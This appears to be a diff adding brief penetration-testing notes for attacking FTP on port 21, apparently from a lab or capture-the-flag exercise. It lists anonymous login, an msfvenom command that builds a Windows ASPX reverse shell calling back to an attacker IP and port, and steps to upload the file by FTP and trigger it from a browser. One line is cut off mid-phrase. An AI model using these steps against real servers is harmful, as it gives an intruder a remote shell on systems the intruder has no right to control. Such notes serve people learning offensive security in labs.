@@ -1,0 +1,15 @@
+21 - FTP 
+If Anonymous FTP login allowed 
+Try FTP 10.10.10.5
+root: anonymous
+password : anonymous
+Ls to vuew the files
+if the files are accessible from browser, put a reverse shell and view from browser
+msfvenom --list formats
+msfvenom -p windows/shell_reverse_tcp -f aspx LHOST=10.10.14.33 LPORT=5555 -o reverse-shell.aspx
+
+
+FTP commands : 
+use msfvenom to c
+PUT reverse-shell.aspx
+view the shell in browser
